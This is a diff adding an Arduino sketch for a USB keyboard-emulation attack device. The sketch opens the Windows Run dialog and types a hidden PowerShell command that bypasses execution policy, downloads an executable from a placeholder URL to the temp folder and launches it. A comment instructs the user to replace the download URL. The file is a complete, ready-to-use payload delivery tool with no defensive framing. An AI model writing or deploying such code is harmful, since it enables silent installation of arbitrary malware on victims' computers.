@@ -1,0 +1,37 @@
+// MAKE SURE TO CHANGE DIRECT DOWNLOAD URL IN THE COMMAND ON LINE 25
+#include <HID-Project.h>
+#include <HID-Settings.h>
+
+// Utility function
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  // Start Keyboard and Mouse
+  AbsoluteMouse.begin();
+  Keyboard.begin();
+
+  // Start Payload
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/bob.txt',\\\"$env:temp\\bob.exe\\\"); Start-Process \\\"$env:temp\\bob.exe\\\"\"");
+
+  typeKey(KEY_RETURN);
+
+  // End Payload
+
+  // Stop Keyboard and Mouse
+  Keyboard.end();
+  AbsoluteMouse.end();
+}
+
+// Unused
+void loop() {}
